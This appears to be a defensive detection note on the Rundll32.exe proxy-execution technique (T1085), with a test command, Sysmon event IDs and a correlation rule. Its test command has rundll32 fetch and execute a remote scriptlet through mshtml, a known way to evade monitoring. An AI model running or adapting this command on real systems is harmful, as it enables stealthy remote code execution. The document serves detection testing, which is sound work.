Technique Description: Rundll32.exe (T1085)
------------------------------------
Rundll32.exe is a Windows program that allows for execution of binaries. This can be used by attackers as a defense evasion 
tactic as well as an execution tactic because it can be used as a proxy to run their malicious code since the process may 
not be monitored due to false positives.  

Assumptions 
-------------
We assume that the attacker already has access to the target workstation to run a command line command.

Execution (test script used) 
-------------
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct").Exec();"

Detection 
-------------
Have process monitoring tools to monitor execution of rundll32.exe

Visibility 
-------------
A binary run through rundll32.exe will generate an Event ID 1 on Windows 7 through Sysmon operational logs as Process Create. 
When the script or binary is finished execution it will trigger EventID 5 Process Termination.  

### Filter/ Correlation Rule ###

EventCode=4656 OR EventCode=1 AND rundll32.exe
![rundll32](https://user-images.githubusercontent.com/32250546/55583319-9a745b00-56ef-11e9-897b-5d4d02a65380.png)
